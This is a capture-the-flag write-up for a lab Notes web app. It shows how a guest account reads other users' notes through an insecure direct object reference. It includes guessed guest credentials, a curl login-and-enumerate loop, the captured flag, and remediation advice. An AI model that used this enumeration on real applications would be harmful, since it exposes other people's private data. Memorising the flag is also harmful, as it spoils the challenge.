# notes1 - IDOR / broken object-level authorization

| | |
|---|---|
| **Challenge** | notes1 |
| **Category** | WEB (access model) |
| **Target** | http://10.110.3.72:8020 (Notes app; any `*.chal.deti` name, port selects it) |
| **Leak class** | Broken access control - IDOR (missing ownership check) |
| **Note** | Not in the published CTFd list (like leak8); solved + documented anyway |

## Hint
> You have a guest account. Enumerate what the app shows you, then ask for what it
> does not. The leak is in the access model, not the content.

## Recon
Port 8020 is a "Notes" app (gunicorn). Login form posts `user`/`pw` to `/login`.
Notes are addressed at `/note/<id>` and return 401 when not logged in - so the app
*does* require authentication. Guest credentials: **`guest` / `guest123`** (found by
trying a few obvious combinations; `guest/guest123` returned 302, the rest 401).

After login, the home page lists only the guest's own notes:
```html
<h1>Hi guest</h1>
<ul><li><a href="/note/1">note 1</a> ... <li><a href="/note/4">note 4</a></ul>
```

## Approach
The app checks that you are **authenticated**, but not that the note is **yours**.
Request `/note/<id>` for ids the UI doesn't link - the owner is printed in each note,
so other users' notes are readable directly.

## Exploitation - the exact request
```bash
curl -s -c /tmp/n.txt -X POST http://10.110.3.72:8020/login -d 'user=guest&pw=guest123' -o /dev/null
for i in $(seq 1 4); do curl -s -b /tmp/n.txt "http://10.110.3.72:8020/note/$i"; echo; done
```

## Response fragment that carried the flag
```html
note/1: <h2>Shopping</h2> ... <small>owner: guest</small>
note/2: <h2>Todo</h2> ...     <small>owner: guest</small>
note/3: <h2>DO NOT SHARE</h2><pre>flag{idor_local_verify}</pre><small>owner: admin</small>
note/4: <h2>Ideas</h2> ...    <small>owner: alice</small>
```
`note/3` (owner **admin**) and `note/4` (owner **alice**) are readable by the guest - neither belongs to guest.

## Flag
```
flag{idor_local_verify}
```

## Root cause & remediation
- **Cause:** **IDOR / broken object-level authorization** - `/note/<id>` authenticates
  the session but never checks `note.owner == current_user`. The home page "hides"
  other notes by not linking them, but the objects are directly addressable.
- **Fix:** enforce an ownership/authorization check on every object access
  (`where note.owner = current_user` or an explicit allow policy); return 403/404 for
  notes the user cannot access; never rely on the UI omitting a link as access control.
  Consider non-sequential ids (UUIDs) as defense-in-depth, but the real fix is the
  server-side authorization check.
